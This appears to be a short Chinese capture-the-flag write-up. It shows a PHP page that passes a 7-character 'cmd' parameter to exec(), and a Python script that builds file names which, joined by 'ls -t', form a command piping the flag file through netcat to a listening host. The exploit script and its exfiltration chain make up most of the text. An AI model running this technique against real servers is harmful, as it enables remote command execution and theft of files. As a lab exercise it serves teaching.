## 题目分析

```php
<?php
highlight_file(__FILE__);
error_reporting(E_ALL);

function filter($argv){
    $a = str_replace("/*|?|/","====",$argv);
    return $a;
}

if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 7){
    exec(filter($_GET['cmd']));
} else {
    echo "flag in local path flag file!"
}
```



## 解法二：Python 自动化

```python
import time
import requests

baseurl = "http://192.168.1.61:18080/class09/2/index.php?cmd="

s = requests.session()

list = [
    '>7777',
    '>\ \\',
    '>161\\',
    '>1.\\',
    '>168.\\',
    '>192.\\',
    '>c\ \\',
    '>\|n\\',
    '>flag\\',
    '>t\ \\',
    '>ca\\',
    'ls -t>a'
]

for i in list:
    time.sleep(1)
    url = baseurl + str(i)
    s.get(url)

s.get(baseurl + "sh a")
```
